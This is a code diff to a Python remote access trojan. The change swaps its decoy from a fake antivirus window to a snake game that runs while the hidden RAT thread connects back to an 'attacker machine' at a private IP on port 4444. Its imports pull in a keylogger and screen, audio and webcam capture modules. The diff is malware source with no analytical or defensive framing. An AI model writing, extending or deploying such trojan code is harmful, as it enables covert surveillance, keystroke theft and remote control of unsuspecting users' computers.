@@ -10,8 +10,9 @@ import cv2
 import wave
 import pyaudio
 from PIL import ImageGrab
-from keylogger import startKeylogger
-from antiVi import start_application
+from trojan.keylogger import startKeylogger
+from jeu.snake import jeu 
+
 
 
 # RAT:
@@ -20,7 +21,7 @@ def connect():
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect(('172.20.10.12', 4444))  # IP and Port of the attacker machine
+			s.connect(('192.168.100.6', 4444))  # IP and Port of the attacker machine
 			return s
 		except Exception:
 			time.sleep(5)
@@ -167,10 +168,6 @@ def rat_client():
 		s.close()
 
 
-# M antivirus GUI:
-
-def create_gui():
-	start_application()
 
 
 # Main
@@ -178,19 +175,9 @@ def create_gui():
 def main():
 	ratThread = threading.Thread(target=rat_client, daemon=True)
 	ratThread.start()
-
-	create_gui()
+	jeuThread = threading.Thread(target=jeu ,daemon=True)
+	jeuThread.start()
 
 
 if __name__ == "__main__":
 	main()
-
-
-		
-                
-
-
-        
-
-
-
